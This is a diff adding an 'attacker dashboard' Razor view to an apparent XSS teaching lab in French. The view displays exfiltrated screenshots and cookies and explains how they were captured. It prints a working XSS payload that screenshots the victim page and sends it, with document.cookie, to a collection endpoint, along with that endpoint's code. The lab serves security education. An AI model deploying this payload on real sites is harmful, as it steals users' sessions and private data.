@@ -1,0 +1,133 @@
+@model List<XssLabApp.Models.CapturedData>
+@{
+    ViewData["Title"] = "Dashboard Attaquant";
+}
+
+<div class="row justify-content-center">
+    <div class="col-md-11">
+        <div class="alert alert-warning d-flex align-items-center">
+            <strong class="me-2">DASHBOARD ATTAQUANT</strong>
+            <span>Cette page simule le serveur de l'attaquant qui recoit les donnees exfiltrees par le XSS.</span>
+        </div>
+
+        <div class="d-flex justify-content-between align-items-center mb-4">
+            <h2>Captures exfiltrees (@Model.Count)</h2>
+            @if (Model.Count > 0)
+            {
+                <form asp-action="Clear" method="post">
+                    <button type="submit" class="btn btn-outline-danger btn-sm">Vider les captures</button>
+                </form>
+            }
+        </div>
+
+        @if (Model.Count == 0)
+        {
+            <div class="card">
+                <div class="card-body text-center py-5">
+                    <h5 class="text-muted">Aucune capture recue</h5>
+                    <p class="text-muted">
+                        Allez sur la
+                        <a asp-controller="Guestbook" asp-action="Vulnerable" class="text-danger">page vulnerable</a>,
+                        injectez le payload XSS, puis revenez ici.
+                    </p>
+                </div>
+            </div>
+        }
+
+        @foreach (var capture in Model.OrderByDescending(c => c.CapturedAt))
+        {
+            <div class="card border-danger mb-4">
+                <div class="card-header bg-danger text-white d-flex justify-content-between">
+                    <span>Capture #@capture.Id</span>
+                    <span>@capture.CapturedAt.ToString("dd/MM/yyyy HH:mm:ss")</span>
+                </div>
+                <div class="card-body">
+                    <div class="row">
+                        <!-- Screenshot -->
+                        <div class="col-md-8">
+                            <h6>Screenshot de la page victime :</h6>
+                            <div class="border rounded p-1 bg-dark">
+                                <img src="@capture.ScreenshotBase64" alt="Screenshot capture"
+                                     class="img-fluid rounded" style="max-height: 500px; width: 100%; object-fit: contain;" />
+                            </div>
+                        </div>
+                        <!-- Donnees volees -->
+                        <div class="col-md-4">
+                            <h6>Donnees exfiltrees :</h6>
+                            <table class="table table-sm table-bordered">
+                                <tr>
+                                    <td class="fw-bold bg-light">URL</td>
+                                    <td><small class="text-break">@capture.PageUrl</small></td>
+                                </tr>
+                                <tr>
+                                    <td class="fw-bold bg-light">Cookies</td>
+                                    <td>
+                                        <code class="text-break">
+                                            @(string.IsNullOrEmpty(capture.Cookies) ? "(aucun ou HttpOnly)" : capture.Cookies)
+                                        </code>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="fw-bold bg-light">User-Agent</td>
+                                    <td><small class="text-break">@capture.UserAgent</small></td>
+                                </tr>
+                            </table>
+
+                            <h6 class="mt-3">Que peut faire l'attaquant ?</h6>
+                            <ul class="small">
+                                <li>Lire les donnees sensibles sur la capture (IBAN, solde, emails...)</li>
+                                <li>Voler les cookies de session (si pas HttpOnly)</li>
+                                <li>Identifier le navigateur/OS de la victime</li>
+                                <li>Preparer une attaque ciblee (spear phishing)</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        }
+
+        <!-- Explication technique -->
+        <div class="card border-info mb-4">
+            <div class="card-header bg-info text-white">Fonctionnement technique</div>
+            <div class="card-body">
+                <h6>Cote client (navigateur de la victime) :</h6>
+<pre class="bg-dark text-light p-3 rounded"><code>// 1. Le payload injecte charge html2canvas dynamiquement
+var script = document.createElement('script');
+script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
+
+// 2. Une fois charge, capture toute la page
+script.onload = function() {
+    html2canvas(document.body).then(function(canvas) {
+
+        // 3. Envoie le screenshot + donnees a l'attaquant
+        fetch('/api/exfiltration/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                image: canvas.toDataURL(),    // Screenshot en base64
+                url: window.location.href,    // URL de la page
+                cookies: document.cookie,     // Cookies accessibles
+                userAgent: navigator.userAgent // Info navigateur
+            })
+        });
+    });
+};</code></pre>
+
+                <h6 class="mt-3">Cote serveur (API de l'attaquant) :</h6>
+<pre class="bg-dark text-light p-3 rounded"><code>// Endpoint ASP.NET qui recoit et stocke les captures
+[HttpPost("capture")]
+public IActionResult Capture([FromBody] CaptureRequest request)
+{
+    _store.Add(new CapturedData
+    {
+        ScreenshotBase64 = request.Image,   // Image en data:image/png;base64,...
+        PageUrl = request.Url,
+        Cookies = request.Cookies,
+        UserAgent = request.UserAgent
+    });
+    return Ok();
+}</code></pre>
+            </div>
+        </div>
+    </div>
+</div>
